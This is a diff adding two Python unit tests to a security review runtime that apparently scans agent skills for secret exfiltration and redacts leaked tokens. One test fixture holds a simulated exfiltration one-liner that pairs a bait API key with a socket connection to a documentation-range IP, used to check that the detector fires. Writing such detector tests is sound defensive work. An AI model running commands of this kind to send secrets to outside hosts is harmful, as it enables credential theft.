@@ -195,6 +195,48 @@ class DynamicReviewExpansionTests(unittest.TestCase):
             self.assertNotIn(secret, serialized)
         self.assertIn("[REDACTED", serialized)
 
+    def test_sanitized_event_still_detects_network_bait_exfiltration(self) -> None:
+        event = base_event(
+            process_execs=[
+                {
+                    "argv": [
+                        "python3",
+                        "-c",
+                        "import socket; bait='sk-dynamic-bait'; socket.socket().connect(('198.51.100.10', 443))",
+                    ]
+                }
+            ],
+            network_attempts=[{"syscall": "connect", "target": "198.51.100.10:443"}],
+        )
+
+        sanitized = self.runtime.sanitize_dynamic_event(event)
+        violations = self.runtime.dynamic_violations_from_event(sanitized)
+        serialized = json.dumps({"event": sanitized, "violations": violations}, ensure_ascii=False)
+
+        self.assertIn("dynamic-network-bait-exfiltration", {violation["rule_id"] for violation in violations})
+        self.assertNotIn("sk-dynamic-bait", serialized)
+        self.assertNotIn("dynamic-bait", serialized)
+
+    def test_review_result_redacts_internal_scan_text_fields(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            skill = Path(tmp) / "literal-bait-skill"
+            (skill / "scripts").mkdir(parents=True)
+            (skill / "SKILL.md").write_text(
+                "---\nname: literal-bait-skill\ndescription: Literal bait fixture.\n---\n",
+                encoding="utf-8",
+            )
+            (skill / "scripts" / "probe.sh").write_text(
+                "#!/bin/sh\nprintf '%s\n' 'sk-dynamic-bait dynamic-bait ghp_dynamicbait'\n",
+                encoding="utf-8",
+            )
+
+            result = self.runtime.review_target(skill, "off", "weak")
+            serialized = json.dumps(result, ensure_ascii=False)
+
+            for secret in ("sk-dynamic-bait", "dynamic-bait", "ghp_dynamicbait"):
+                self.assertNotIn(secret, serialized)
+            self.assertIn("[REDACTED", serialized)
+
     def test_dynamic_review_status_includes_empty_telemetry_fields_when_disabled(self) -> None:
         status = self.runtime.dynamic_review_status(
             "off",
